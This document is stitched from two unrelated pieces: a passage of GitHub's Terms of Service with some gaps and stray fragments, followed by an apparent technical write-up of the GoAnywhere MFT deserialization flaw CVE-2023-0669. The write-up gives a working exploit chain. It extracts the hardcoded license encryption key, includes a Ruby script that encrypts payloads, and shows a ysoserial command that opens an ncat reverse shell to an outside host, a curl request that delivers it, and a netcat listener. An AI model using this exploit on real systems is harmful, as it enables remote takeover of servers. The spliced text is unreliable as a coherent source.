2. The “Agreement” refers, collectively, to all the terms, conditions, notices contained or referenced in this document (the “Terms of Service” or the "Terms") and all other operating rules, policies (including the GitHub Privacy Statement, available at [github.com/site/privacy](https://github.com/site/privacy)) and procedures that we may publish from time to time on the Website. Most of our site policies are available at [docs.github.com/categories/site-policy](/en/site-policy).
3. "Beta Previews" mean software, services, or features identified as alpha, beta, preview, early access, or evaluation, or words or phrases with similar meanings.
4. “Content” refers to content featured or displayed through the Website, including without limitation code, text, data, articles, images, photographs, graphics, software, applications, packages, designs, features, and other materials that are available on the Website or otherwise available through the Service. "Content" also includes Services. “User-Generated Content” is Content, written or otherwise, created or uploaded by our Users. "Your Content" is Content that you create or own.
5. “GitHub,” “We,” and “Us” refer to GitHub, Inc., as well as our affiliates, directors, subsidiaries, contractors, licensors, officers, agents, and employees.
6. The “Service” refers to the applications, software, products, and services provided by GitHub, including any Beta Previews.
7. “The User,” “You,” and “Your” refer to the individual person, company, or organization that has visited or is using the Website or Service; that accesses or uses any part of the Account; or that directs the use of the Account in the performance of its functions. A User must be at least 13 years of age. Special terms may apply for business or government Accounts (See [Section B(5): Additional Terms](#5-additional-terms)).
8. The “Website” refers to GitHub’s website located at [github.com](https://github.com/), and all content, services, and products provided by GitHub at or through the Website. It also refers to GitHub-owned subdomains of github.com, such as [education.github.com](https://education.github.com/) and [pages.github.com](https://pages.github.com/). These Terms also govern GitHub’s conference websites, such as [githubuniverse.com](https://githubuniverse.com/), and product websites, such as [electronjs.org](https://www.electronjs.org/).

If those additional terms conflict with this Agreement, the more specific terms apply to the relevant page or service.

## [B. Account Terms](#b-account-terms)

**Short version:** *Personal Accounts and Organizations have different administrative controls; a human must create your Account; you must be 13 or over; you must provide a valid email address; and you may not have more than one free Account. You alone are responsible for your Account and anything that happens while you are signed in to or using your Account. You are responsible for keeping your Account secure.*

### [1. Account Controls](#1-account-controls)

* Users. Subject to these Terms, you retain ultimate administrative control over your Personal Account and the Content within it.
* Organizations. The "owner" of an Organization that was created under these Terms has ultimate administrative control over that Organization and the Content within it. Within the Service, an owner can manage User access to the Organization’s data and projects. An Organization may have multiple owners, but there must be at least one Personal Account designated as an owner of an Organization. If you are the owner of an Organization under these Terms, we consider you responsible for the actions that are performed on or through that Organization.

### [2. Required Information](#2-required-information)

You must provide a valid email address in order to complete the signup process. Any other information requested, such as your real name, is optional, unless you are accepting these terms on behalf of a legal entity (in which case we need more information about the legal entity) or if you opt for a [paid Account](#k-payment), in which case additional information will be necessary for billing purposes.

### [3. Account Requirements](#3-account-requirements)

We have a few simple rules for Personal Accounts on GitHub's Service.

* You must be a human to create an Account. Accounts registered by "bots" or other automated methods are not permitted. We do permit machine accounts:
* A machine account is an Account set up by an individual human who accepts the Terms on behalf of the Account, provides a valid email address, and is responsible for its actions. A machine account is used exclusively for performing automated tasks. Multiple users may direct the actions of a machine account, but the owner of the Account is ultimately responsible for the machine's actions. You may maintain no more than one free machine account in addition to your free Personal Account.
* One person or legal entity may maintain no more than one free Account (if you choose to control a machine account as well, that's fine, but it can only be used for running a machine).
* You must be age 13 or older. While we are thrilled to see brilliant young coders get excited by learning to program, we must comply with United States law. GitHub does not target our Service to children under 13, and we do not permit any Users under 13 on our Service. If we learn of any User under the age of 13, we will [terminate that User’s Account immediately](#l-cancellation-and-termination). If you are a resident of a country outside the United States, your country’s minimum age may be older; in such a case, you are responsible for complying with your country’s laws.
* Your login may only be used by one person — i.e., a single login may not be shared by multiple people. A paid Organization may only provide access to as many Personal Accounts as your subscription allows.
* You may not use GitHub in violation of export control or sanctions laws of the United States or any other applicable jurisdiction. You may not use GitHub if you are or are working on behalf of a [Specially Designated National (SDN)](https://www.treasury.gov/resource-center/sanctions/SDN-List/Pages/default.aspx) or a person subject to similar blocking or denied party prohibitions administered by a U.S. government agency. GitHub may allow persons in certain sanctioned countries or territories to access certain GitHub services pursuant to U.S. government authorizations. For more information, please see our [Export Controls policy](/en/site-policy/other-site-policies/github-and-trade-controls).

### [4. Account Security](#4-account-security)

You are responsible for keeping your Account secure while you use our Service. We offer tools such as two-factor authentication to help you maintain your Account's security, but the content of your Account and its security are up to you.

* You are responsible for all content posted and activity that occurs under your Account (even when content is posted by others who have Accounts under your Account).
* You are responsible for maintaining the security of your Account and password. GitHub cannot and will not be liable for any loss or damage from your failure to comply with this security obligation.
* You will promptly notify GitHub by contacting us through the [GitHub Support portal](https://support.github.com/) if you become aware of any unauthorized use of, or access to, our Service through your Account, including any unauthorized use of your password or Account.

### [5. Additional Terms](#5-additional-terms)

In some situations, third parties' terms may apply to your use of GitHub. For example, you may be a member of an organization on GitHub with its own terms or license agreements; you may download an application that integrates with GitHub; or you may use GitHub to authenticate to another service. Please be aware that while these Terms are our full agreement with you, other parties' terms govern their relationships with you.

If you are a government User or otherwise accessing or using any GitHub Service in a government capacity, this [Government Amendment to GitHub Terms of Service](/en/site-policy/site-policy-deprecated/amendment-to-github-terms-of-service-applicable-to-us-federal-government-users) applies to you, and you agree to its provisions.

If you have signed up for GitHub Enterprise Cloud, the [Enterprise Cloud Addendum](/en/site-policy/site-policy-deprecated/github-enterprise-service-level-agreement) applies to you, and you agree to its provisions.

## [C. Acceptable Use](#c-acceptable-use)

**Short version:** *GitHub hosts a wide variety of collaborative projects from all over the world, and that collaboration only works when our users are able to work together in good faith. While using the service, you must follow the terms of this section, which include some restrictions on content you can post, conduct on the service, and other limitations. In short, be excellent to each other.*

Your use of the Website and Service must not violate any applicable laws, including copyright or trademark laws, export control or sanctions laws, or other laws in your jurisdiction. You are responsible for making sure that your use of the Service is in compliance with laws and any applicable regulations.

You agree that you will not under any circumstances violate our [Acceptable Use Policies](/en/site-policy/acceptable-use-policies/github-acceptable-use-policies) or [Community Guidelines](/en/site-policy/github-terms/github-community-guidelines).

## [D. User-Generated Content](#d-user-generated-content)

**Short version:** *You own content you create, but you allow us certain rights to it, so that we can display and share the content you post. You still have control over your content, and responsibility for it, and the rights you grant us are limited to those we need to provide the service. We have the right to remove content or close Accounts if we need to.*

### [1. Responsibility for User-Generated Content](#1-responsibility-for-user-generated-content)

You may create or upload User-Generated Content while using the Service. You are solely responsible for the content of, and for any harm resulting from, any User-Generated Content that you post, upload, link to or otherwise make available via the Service, regardless of the form of that Content. We are not responsible for any public display or misuse of your User-Generated Content.

### [2. GitHub May Remove Content](#2-github-may-remove-content)

We have the right to refuse or remove any User-Generated Content that, in our sole discretion, violates any laws or [GitHub terms or policies](/en/site-policy). User-Generated Content displayed on GitHub Mobile may be subject to mobile app stores' additional terms.

### [3. Ownership of Content, Right to Post, and License Grants](#3-ownership-of-content-right-to-post-and-license-grants)

You retain ownership of and responsibility for Your Content. If you're posting anything you did not create yourself or do not own the rights to, you agree that you are responsible for any Content you post; that you will only submit Content that you have the right to post; and that you will fully comply with any third party licenses relating to Content you post.

Because you retain ownership of and responsibility for Your Content, we need you to grant us — and other GitHub Users — certain legal permissions, listed in Sections D.4 — D.7. These license grants apply to Your Content. If you upload Content that already comes with a license granting GitHub the permissions we need to run our Service, no additional license is required. You understand that you will not receive any payment for any of the rights granted in Sections D.4 — D.7. The licenses you grant to us will end when you remove Your Content from our servers, unless other Users have forked it.

### [4. License Grant to Us](#4-license-grant-to-us)

We need the legal right to do things like host Your Content, publish it, and share it. You grant us and our legal successors the right to store, archive, parse, and display Your Content, and make incidental copies, as necessary to provide the Service, including improving the Service over time. This license includes the right to do things like copy it to our database and make backups; show it to you and other users; parse it into a search index or otherwise analyze it on our servers; share it with other users; and perform it, in case Your Content is something like music or video.

This license does not grant GitHub the right to sell Your Content. It also does not grant GitHub the right to otherwise distribute or use Your Content outside of our provision of the Service, except that as part of the right to archive Your Content, GitHub may permit our partners to store and archive Your Content in public repositories in connection with the [GitHub Arctic Code Vault and GitHub Archive Program](https://archiveprogram.github.com/).

### [5. License Grant to Other Users](#5-license-grant-to-other-users)

Any User-Generated Content you post publicly, including issues, comments, and contributions to other Users' repositories, may be viewed by others. By setting your repositories to be viewed publicly, you agree to allow others to view and "fork" your repositories (this means that others may make their own copies of Content from your repositories in repositories they control).

If you set your pages and repositories to be viewed publicly, you grant each User of GitHub a nonexclusive, worldwide license to use, display, and perform Your Content through the GitHub Service and to reproduce Your Content solely on GitHub as permitted through GitHub's functionality (for example, through forking). You may grant further rights if you [adopt a license](/en/communities/setting-up-your-project-for-healthy-contributions/adding-a-license-to-a-repository#including-an-open-source-license-in-your-repository). If you are uploading Content you did not create or own, you are responsible for ensuring that the Content you upload is licensed under terms that grant these permissions to other GitHub Users.

### [6. Contributions Under Repository License](#6-contributions-under-repository-license)

Whenever you add Content to a repository containing notice of a license, you license that Content under the same terms, and you agree that you have the right to license that Content under those terms. If you have a separate agreement to license that Content under different terms, such as a contributor license agreement, that agreement will supersede.

Isn't this just how it works already? Yep. This is widely accepted as the norm in the open-source community; it's commonly referred to by the shorthand "inbound=outbound". We're just making it explicit.

### [7. Moral Rights](#7-moral-rights)

You retain all moral rights to Your Content that you upload, publish, or submit to any part of the Service, including the rights of integrity and attribution. However, you waive these rights and agree not to assert them against us, to enable us to reasonably exercise the rights granted in Section D.4, but not otherwise.

To the extent this agreement is not enforceable by applicable law, you grant GitHub the rights we need to use Your Content without attribution and to make reasonable adaptations of Your Content as necessary to render the Website and provide the Service.

## [E. Private Repositories](#e-private-repositories)

**Short version:** *We treat the content of private repositories as confidential, and we only access it as described in our Privacy Statement—for security purposes, to assist the repository owner with a support matter, to maintain the integrity of the Service, to comply with our legal obligations, if we have reason to believe the contents are in violation of the law, or with your consent.*

### [1. Control of Private Repositories](#1-control-of-private-repositories)

Some Accounts may have private repositories, which allow the User to control access to Content.

### [2. Confidentiality of Private Repositories](#2-confidentiality-of-private-repositories)

GitHub considers the contents of private repositories to be confidential to you. GitHub will protect the contents of private repositories from unauthorized use, access, or disclosure in the same manner that we would use to protect our own confidential information of a similar nature and in no event with less than a reasonable degree of care.

### [3. Access](#3-access)

GitHub personnel may only access the content of your private repositories in the situations described in our [Privacy Statement](/en/site-policy/privacy-policies/github-privacy-statement#repository-contents).

You may choose to enable additional access to your private repositories. For example:

* You may enable various GitHub services or features that require additional rights to Your Content in private repositories. These rights may vary depending on the service or feature, but GitHub will continue to treat your private repository Content as confidential. If those services or features require rights in addition to those we need to provide the GitHub Service, we will provide an explanation of those rights.

Additionally, we may be [compelled by law](/en/site-policy/privacy-policies/github-privacy-statement#for-legal-disclosure) to disclose the contents of your private repositories.

GitHub will provide notice regarding our access to private repository content, unless [for legal disclosure](/en/site-policy/privacy-policies/github-privacy-statement#for-legal-disclosure), to comply with our legal obligations, or where otherwise bound by requirements under law, for automated scanning, or if in response to a security threat or other risk to security.

## [F. Copyright Infringement and DMCA Policy](#f-copyright-infringement-and-dmca-policy)

If you believe that content on our website violates your copyright, please contact us in accordance with our [Digital Millennium Copyright Act Policy](/en/site-policy/content-removal-policies/dmca-takedown-policy). If you are a copyright owner and you believe that content on GitHub violates your rights, please contact us via [our convenient DMCA form](https://github.com/contact/dmca) or by emailing copyright@github.com. There may be legal consequences for sending a false or frivolous takedown notice. Before sending a takedown request, you must consider legal uses such as fair use and licensed uses.

We will terminate the Accounts of [repeat infringers](/en/site-policy/content-removal-policies/dmca-takedown-policy#e-repeated-infringement) of this policy.

## [G. Intellectual Property Notice](#g-intellectual-property-notice)

**Short version:** *We own the service and all of our content. In order for you to use our content, we give you certain rights to it, but you may only use our content in the way we have allowed.*

### [1. GitHub's Rights to Content](#1-githubs-rights-to-content)

GitHub and our licensors, vendors, agents, and/or our content providers retain ownership of all intellectual property rights of any kind related to the Website and Service. We reserve all rights that are not expressly granted to you under this Agreement or by law. The look and feel of the Website and Service is copyright © GitHub, Inc. All rights reserved.

This Agreement is licensed under this [Creative Commons Zero license](https://creativecommons.org/publicdomain/zero/1.0/). For details, see our [site-policy repository](https://github.com/github/site-policy#license).

## [H. API Terms](#h-api-terms)

**Short version:** *You agree to these Terms of Service, plus this Section H, when using any of GitHub's APIs (Application Provider Interface), including use of the API through a third party product that accesses GitHub.*

Abuse or excessively frequent requests to GitHub via the API may result in the temporary or permanent suspension of your Account's access to the API. GitHub, in our sole discretion, will determine abuse or excessive usage of the API. We will make a reasonable attempt to warn you via email prior to suspension.

You may not share API tokens to exceed GitHub's rate limitations.

You may not use the API to download data or Content from GitHub for spamming purposes, including for the purposes of selling GitHub users' personal information, such as to recruiters, headhunters, and job boards.

All use of the GitHub API is subject to these Terms of Service and the [GitHub Privacy Statement](https://github.com/site/privacy).

GitHub may offer subscription-based access to our API for those Users who require high-throughput access or access that would result in resale of GitHub's Service.

## [I. GitHub Additional Product Terms](#i-github-additional-product-terms)

**Short version:** *You need to follow certain specific terms and conditions for GitHub's various features and products, and you agree to the Supplemental Terms and Conditions when you agree to this Agreement.*

Some Service features may be subject to additional terms specific to that feature or product as set forth in the GitHub Additional Product Terms. By accessing or using the Services, you also agree to the [GitHub Additional Product Terms](/en/site-policy/github-terms/github-terms-for-additional-products-and-features).

## [J. Beta Previews](#j-beta-previews)

**Short version:** *Beta Previews may not be supported or may change at any time. You may receive confidential information through those programs that must remain confidential while the program is private. We'd love your feedback to make our Beta Previews better.*

### [1. Subject to Change](#1-subject-to-change)

Beta Previews may not be supported and may be changed at any time without notice. In addition, Beta Previews are not subject to the same security measures and auditing to which the Service has been and is subject. **By using a Beta Preview, you use it at your own risk.**

### [2. Confidentiality](#2-confidentiality)

As a user of Beta Previews, you may get access to special information that isn’t available to the rest of the world. Due to the sensitive nature of this information, it’s important for us to make sure that you keep that information secret.

**Confidentiality Obligations.** You agree that any non-public Beta Preview information we give you, such as information about a private Beta Preview, will be considered GitHub’s confidential information (collectively, “Confidential Information”), regardless of whether it is marked or identified as such. You agree to only use such Confidential Information for the express purpose of testing and evaluating the Beta Preview (the “Purpose”), and not for any other purpose. You should use the same degree of care as you would with your own confidential information, but no less than reasonable precautions to prevent any unauthorized use, disclosure, publication, or dissemination of our Confidential Information. You promise not to disclose, publish, or disseminate any Confidential Information to any third party, unless we don’t otherwise prohibit or restrict such disclosure (for example, you might be part of a GitHub-organized group discussion about a private Beta Preview feature).

**Exceptions.** Confidential Information will not include information that is: (a) or becomes publicly available without breach of this Agreement through no act or inaction on your part (such as when a private Beta Preview becomes a public Beta Preview); (b) known to you before we disclose it to you; (c) independently developed by you without breach of any confidentiality obligation to us or any third party; or (d) disclosed with permission from GitHub. You will not violate the terms of this Agreement if you are required to disclose Confidential Information pursuant to operation of law, provided GitHub has been given reasonable advance written notice to object, unless prohibited by law.

### [3. Feedback](#3-feedback)

We’re always trying to improve of products and services, and your feedback as a Beta Preview user will help us do that. If you choose to give us any ideas, know-how, algorithms, code contributions, suggestions, enhancement requests, recommendations or any other feedback for our products or services (collectively, “Feedback”), you acknowledge and agree that GitHub will have a royalty-free, fully paid-up, worldwide, transferable, sub-licensable, irrevocable and perpetual license to implement, use, modify, commercially exploit and/or incorporate the Feedback into our products, services, and documentation.

## [K. Payment](#k-payment)

**Short version:** *You are responsible for any fees associated with your use of GitHub. We are responsible for communicating those fees to you clearly and accurately, and letting you know well in advance if those prices change.*

### [1. Pricing](#1-pricing)

Our pricing and payment terms are available at [github.com/pricing](https://github.com/pricing). If you agree to a subscription price, that will remain your price for the duration of the payment term; however, prices are subject to change at the end of a payment term.

### [2. Upgrades, Downgrades, and Changes](#2-upgrades-downgrades-and-changes)

* We will immediately bill you when you upgrade from the free plan to any paying plan.
* If you change from a monthly billing plan to a yearly billing plan, GitHub will bill you for a full year at the next monthly billing date.
* If you upgrade to a higher level of service, we will bill you for the upgraded plan immediately.
* You may change your level of service at any time by [choosing a plan option](https://github.com/pricing) or going into your [Billing settings](https://github.com/settings/billing). If you choose to downgrade your Account, you may lose access to Content, features, or capacity of your Account. Please see our section on [Cancellation](#l-cancellation-and-termination) for information on getting a copy of that Content.

### [3. Billing Schedule; No Refunds](#3-billing-schedule-no-refunds)

**Payment Based on Plan** For monthly or yearly payment plans, the Service is billed in advance on a monthly or yearly basis respectively and is non-refundable. There will be no refunds or credits for partial months of service, downgrade refunds, or refunds for months unused with an open Account; however, the service will remain active for the length of the paid billing period. In order to treat everyone equally, no exceptions will be made.

**Payment Based on Usage** Some Service features are billed based on your usage. A limited quantity of these Service features may be included in your plan for a limited term without additional charge. If you choose to use paid Service features beyond the quantity included in your plan, you pay for those Service features based on your actual usage in the preceding month. Monthly payment for these purchases will be charged on a periodic basis in arrears. See [GitHub Additional Product Terms for Details](/en/site-policy/github-terms/github-terms-for-additional-products-and-features).

**Invoicing** For invoiced Users, User agrees to pay the fees in full, up front without deduction or setoff of any kind, in U.S. Dollars. User must pay the fees within thirty (30) days of the GitHub invoice date. Amounts payable under this Agreement are non-refundable, except as otherwise provided in this Agreement. If User fails to pay any fees on time, GitHub reserves the right, in addition to taking any other action at law or equity, to (i) charge interest on past due amounts at 1.0% per month or the highest interest rate allowed by law, whichever is less, and to charge all expenses of recovery, and (ii) terminate the applicable order form. User is solely responsible for all taxes, fees, duties and governmental assessments (except for taxes based on GitHub's net income) that are imposed or become due in connection with this Agreement.

### [4. Authorization](#4-authorization)

Free Accounts are not required to provide payment information.

## [L. Cancellation and Termination](#l-cancellation-and-termination)

**Short version:** *You may close your Account at any time. If you do, we'll treat your information responsibly.*

### [1. Account Cancellation](#1-account-cancellation)

It is your responsibility to properly cancel your Account with GitHub. You can [cancel your Account at any time](/en/billing/managing-the-plan-for-your-github-account/downgrading-your-accounts-plan) by going into your Settings in the global navigation bar at the top of the screen. The Account screen provides a simple, no questions asked cancellation link. We are not able to cancel Accounts in response to an email or phone request.

### [2. Upon Cancellation](#2-upon-cancellation)

We will retain and use your information as necessary to comply with our legal obligations, resolve disputes, and enforce our agreements, but barring legal requirements, we will delete your full profile and the Content of your repositories within 90 days of cancellation or termination (though some information may remain in encrypted backups). This information cannot be recovered once your Account is canceled.

We will not delete Content that you have contributed to other Users' repositories or that other Users have forked.

Upon request, we will make a reasonable effort to provide an Account owner with a copy of your lawful, non-infringing Account contents after Account cancellation, termination, or downgrade. You must make this request within 90 days of cancellation, termination, or downgrade.

### [3. GitHub May Terminate](#3-github-may-terminate)

GitHub has the right to suspend or terminate your access to all or any part of the Website at any time, with or without cause, with or without notice, effective immediately. GitHub reserves the right to refuse service to anyone for any reason at any time.

### [4. Survival](#4-survival)

## [M. Communications with GitHub](#m-communications-with-github)

**Short version:** *We use email and other electronic means to stay in touch with our users.*

### [1. Electronic Communication Required](#1-electronic-communication-required)

For contractual purposes, you (1) consent to receive communications from us in an electronic form via the email address you have submitted or via the Service; and (2) agree that all Terms of Service, agreements, notices, disclosures, and other communications that we provide to you electronically satisfy any legal requirement that those communications would satisfy if they were on paper. This section does not affect your non-waivable rights.

### [2. Legal Notice to GitHub Must Be in Writing](#2-legal-notice-to-github-must-be-in-writing)

Communications made through email or GitHub Support's messaging system will not constitute legal notice to GitHub or any of its officers, employees, agents or representatives in any situation where notice to GitHub is required by contract or any law or regulation. Legal notice to GitHub must be in writing and [served on GitHub's legal agent](/en/site-policy/other-site-policies/guidelines-for-legal-requests-of-user-data#submitting-requests).

### [3. No Phone Support](#3-no-phone-support)

GitHub only offers support via email, in-Service communications, and electronic messages. We do not offer telephone support.

## [N. Disclaimer of Warranties](#n-disclaimer-of-warranties)

**Short version:** *We provide our service as is, and we make no promises or guarantees about this service. Please read this section carefully; you should understand what to expect.*

GitHub provides the Website and the Service “as is” and “as available,” without warranty of any kind. Without limiting this, we expressly disclaim all warranties, whether express, implied or statutory, regarding the Website and the Service including without limitation any warranty of merchantability, fitness for a particular purpose, title, security, accuracy and non-infringement.

GitHub does not warrant that the Service will meet your requirements; that the Service will be uninterrupted, timely, secure, or error-free; that the information provided through the Service is accurate, reliable or correct; that any defects or errors will be corrected; that the Service will be available at any particular time or location; or that the Service is free of viruses or other harmful components. You assume full responsibility and risk of loss resulting from your downloading and/or use of files, information, content or other material obtained from the Service.

## [O. Limitation of Liability](#o-limitation-of-liability)

**Short version:** *We will not be liable for damages or losses arising from your use or inability to use the service or otherwise arising under this agreement. Please read this section carefully; it limits our obligations to you.*

You understand and agree that we will not be liable to you or any third party for any loss of profits, use, goodwill, or data, or for any incidental, indirect, special, consequential or exemplary damages, however arising, that result from

* the use, disclosure, or display of your User-Generated Content;
* your use or inability to use the Service;
* any modification, price change, suspension or discontinuance of the Service;
* the Service generally or the software or systems that make the Service available;
* unauthorized access to or alterations of your transmissions or data;
* statements or conduct of any third party on the Service;
* any other user interactions that you input or receive through your use of the Service; or
* any other matter relating to the Service.

Our liability is limited whether or not we have been informed of the possibility of such damages, and even if a remedy set forth in this Agreement is found to have failed of its essential purpose. We will have no liability for any failure or delay due to matters beyond our reasonable control.

## [P. Release and Indemnification](#p-release-and-indemnification)

**Short version:** *You are responsible for your use of the service. If you harm someone else or get into a dispute with someone else, we will not be involved.*

If you have a dispute with one or more Users, you agree to release GitHub from any and all claims, demands and damages (actual and consequential) of every kind and nature, known and unknown, arising out of or in any way connected with such disputes.

You agree to indemnify us, defend us, and hold us harmless from and against any and all claims, liabilities, and expenses, including attorneys’ fees, arising out of your use of the Website and the Service, including but not limited to your violation of this Agreement, provided that GitHub (1) promptly gives you written notice of the claim, demand, suit or proceeding; (2) gives you sole control of the defense and settlement of the claim, demand, suit or proceeding (provided that you may not settle any claim, demand, suit or proceeding unless the settlement unconditionally releases GitHub of all liability); and (3) provides to you all reasonable assistance, at your expense.

Customer's continued use of the Service after those 30 days constitutes agreement to those revisions of this Agreement. For any other modifications, your continued use of the Website constitutes agreement to our revisions of these Terms of Service. You can view all changes to these Terms in our [Site Policy](https://github.com/github/site-policy) repository.

We reserve the right at any time and from time to time to modify or discontinue, temporarily or permanently, the Website (or any part of it) with or without notice.

###### Technical Analysis

## Description

On February 1, 2023, Fortra (formerly HelpSystems) posted a security advisory for a remote pre-authentication remote code execution vulnerability in their [GoAnywhere MFT](https://www.goanywhere.com/) managed file transfer solution. The advisory requires a (free) account in order to view; notably, hiding security advisories behind a customer portal is something we heavily discourage. It’s optimal when this type of information is public so users can stay informed and protect themselves as easily as possible.

As of this writing, no patch is available, but Fortra has posted steps to mitigate the issue by disabling the licensing service.

Based on the mitigations published by Fortra, we confirmed that this is a pre-authentication deserialization issue. To exploit the vulnerability, you either need network-level access to GoAnywhere MFT’s administration port (by default, port 8000), but this can also be exploited via an internal user’s browser, as we’ll demonstrate below.

*Updated on 2023-02-13*

On February 7, 2023, Fortra released version 7GoAnywhere MFT 7.1.2 to resolve this issue. We added an analysis of the patch below.

## Technical analysis

The vendor’s advisory was helpful, since it points to the vulnerable endpoint:

```
<servlet>
     <servlet-name>License Response Servlet</servlet-name>
     <servlet-class>com.linoma.ga.ui.admin.servlet.LicenseResponseServlet</servlet-class>
     <load-on-startup>0</load-on-startup>
</servlet>
<servlet-mapping>
     <servlet-name>Licenses Response Servlet</servlet-name>
     <url-pattern>/lic/accept/</url-pattern>

```

Using the [`jadx` Java decompiler](https://github.com/skylot/jadx), we decompiled their application and found `LicenseResponseServlet`:

```
    public void doPost(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws ServletException, IOException {
        Response response = null;
        try {
            response = LicenseAPI.getResponse(httpServletRequest.getParameter(LicenseServer.BUNDLE_PARAM));
        } catch (Exception e) {
            LOGGER.error("Error parsing license response", (Throwable) e);
            httpServletResponse.sendError(500);
        }
        httpServletRequest.getSession().setAttribute(LicenseServer.RESPONSE_PARAM, response);
        httpServletRequest.getSession().setAttribute(SessionAttributes.SESSION_GOTO_OUTCOME.getAttributeKey(), ADMIN_LICENSE_OUTCOME);
        httpServletResponse.sendRedirect(httpServletRequest.getScheme() + "://" + httpServletRequest.getServerName() + ":" + httpServletRequest.getServerPort() + "/goanywhere/admin/License.xhtml");
    }
    public void doGet(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws ServletException, IOException {
        doPost(httpServletRequest, httpServletResponse);
    }

```

From that, we know it’s a `GET` or `POST` request, uses the parameter `LicenseServer.BUNDLE_PARAM` (which is `bundle`), and the logic in `LicenseAPI.getResponse()`, which simply calls `LicenseController.getResponse()`:

```
    /* JADX INFO: Access modifiers changed from: protected */
    public static Response getResponse(String str) throws BundleException, JAXBException {
        return (Response) inflate(BundleWorker.unbundle(str, getProductKeyConfig(getVersion(str))), Response.class); // getVersion will be 2
    }

```

The `getProductKeyConfig()` code isn’t important, so let’s look at `BundleWorker.unbundle()`:

```
    /* JADX INFO: Access modifiers changed from: protected */
    public static String unbundle(String str, KeyConfig keyConfig) throws BundleException {
        try {
            if (!"1".equals(keyConfig.getVersion())) {
                str = str.substring(0, str.indexOf("$"));
            }
            return new String(decompress(verify(decrypt(decode(str.getBytes(StandardCharsets.UTF_8)), keyConfig.getVersion()), keyConfig)), StandardCharsets.UTF_8);
        } catch (CryptoException e) {
            // [...]
        }
    }

```

The important line is the last one in the `try` block. First, it calls `decode()`, which is base64 decoding:

```
    private static byte[] decode(byte[] bArr) {
        return Base64.decodeBase64(bArr);
    }

```

Then it passes that into `decrypt()`, which, through several abstractions, eventually uses the following encryption configuration in `com.linoma.license.gen2.LicenseEncryptor`:

```
    private static final byte[] IV = {65, 69, 83, 47, 67, 66, 67, 47, 80, 75, 67, 83, 53, 80, 97, 100};
    // [...]

    public void initialize(boolean z) throws Exception {
        if (!z) {
            this.encryptor = new Encryptor(new StandardEncryptionEngine(getInitializationValue(), IV, "AES", "AES/CBC/PKCS5Padding"));
        }
        this.encryptorV2 = new Encryptor(new StandardEncryptionEngine(getInitializationValueV2(), IV, "AES", "AES/CBC/PKCS5Padding"));
        this.initialized = true;
    }

    private byte[] getInitializationValue() throws Exception {
        return SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1").generateSecret(new PBEKeySpec(new String("go@nywhereLicenseP@$$wrd".getBytes(), "UTF-8").toCharArray(), new byte[]{-19, 45, -32, -73, 65, 123, -7, 85}, 9535, 256)).getEncoded();
    }

    private byte[] getInitializationValueV2() throws Exception {
        return SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1").generateSecret(new PBEKeySpec(new String("pFRgrOMhauusY2ZDShTsqq2oZXKtoW7R".getBytes(), "UTF-8").toCharArray(), new byte[]{99, 76, 71, 87, 49, 74, 119, 83, 109, 112, 50, 75, 104, 107, 56, 73}, 3392, 256)).getEncoded();
    }

```

The `V2` variation of the function is what we’ll use. It generates a key based on a static string. We simply ran that function in our own Java application to pull that string out:

```
$ cat Test.java
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.PBEKeySpec;
public class Test {
  public static void main(String[] args) throws Exception {
    byte []iv = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1").generateSecret(new PBEKeySpec(new String("pFRgrOMhauusY2ZDShTsqq2oZXKtoW7R".getBytes(), "UTF-8").toCharArray(), new byte[]{99, 76, 71, 87, 49, 74, 119, 83, 109, 112, 50, 75, 104, 107, 56, 73}, 3392, 256)).getEncoded();
    System.out.write(iv);
  }
}
$ javac Test.java && java Test | hexdump -C
00000000  0e 69 a3 83 9b 6e cf 45  64 9b 86 1f 4a 27 17 1b  |.i...n.Ed...J'..|
00000010  66 87 0c 95 67 a4 14 4e  ba f3 d5 2f dc 40 64 ca  |f...g..N.../.@d.|

```

That’s the encryption key that the licensing bundle is encrypted with. The IV is hardcoded, and is the literal string `"AES/CBC/PKCS5Pad"`. Based on the key length, we know it’s AES-256. With all this in mind, we can encrypt our own licensing blob:

```
require 'base64'
require 'openssl'
PAYLOAD = File.read(ARGV[0])
KEY = "\x0e\x69\xa3\x83\x9b\x6e\xcf\x45\x64\x9b\x86\x1f\x4a\x27\x17\x1b\x66\x87\x0c\x95\x67\xa4\x14\x4e\xba\xf3\xd5\x2f\xdc\x40\x64\xca"
IV = "AES/CBC/PKCS5Pad"
cipher = OpenSSL::Cipher::AES.new('256-CBC')
cipher.encrypt
cipher.iv = IV
cipher.key = KEY
encryptedObject = cipher.update(PAYLOAD) + cipher.final
print Base64::urlsafe_encode64(encryptedObject)

```

Once the `decrypt()` function completes, the `unbundle()` function passes the decrypted stream into `verify()`:

```
    private static byte[] verify(byte[] bDecryptedObject, KeyConfig keyConfig) throws IOException, ClassNotFoundException, NoSuchAlgorithmException, InvalidKeyException, SignatureException, UnrecoverableKeyException, CertificateException, KeyStoreException {
        ObjectInputStream objectInputStream = null;
        try {
            String str = JCAConstants.SIGNATURE_DSA_SHA1;
            if ("2".equals(keyConfig.getVersion())) {
                str = JCAConstants.SIGNATURE_RSA_SHA512;
            }
            PublicKey publicKey = getPublicKey(keyConfig);
            ObjectInputStream objectInputStream2 = new ObjectInputStream(new ByteArrayInputStream(bDecryptedObject));
            SignedObject signedObject = (SignedObject) objectInputStream2.readObject();
            if (!signedObject.verify(publicKey, Signature.getInstance(str))) {
                throw new IOException("Unable to verify signature!");
            }
            byte[] data = ((SignedContainer) signedObject.getObject()).getData();
            if (objectInputStream2 != null) {
                objectInputStream2.close();
            }
            return data;
        } catch (Throwable th) {
            if (0 != 0) {
                objectInputStream.close();
            }
            throw th;
        }
    }

```

That code loads the decrypted object as a Java object, specifically a `SignedObject`; however, the `objectInputStream2.readObject()` call is enough to know that this is a deserialization issue. So we can generate a payload with [`ysoserial`](https://github.com/frohoff/ysoserial):

```
$ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 "ncat -e /bin/bash 10.0.0.179 4444" > payload.ser

```

Then we encrypt it with our PoC tool and send with `curl` (the `$2` is a version number; version 1 has a different key, but is otherwise essentially the same):

```
$ curl -ikX POST 'http://10.0.0.219:8000/goanywhere/lic/accept?bundle='$(ruby ./poc-cve-2023-0669.rb ./payload.ser)'$2' > /dev/null

```

And, sure enough, we get a shell back:

```
$ nc -v -l -p 4444
[...]
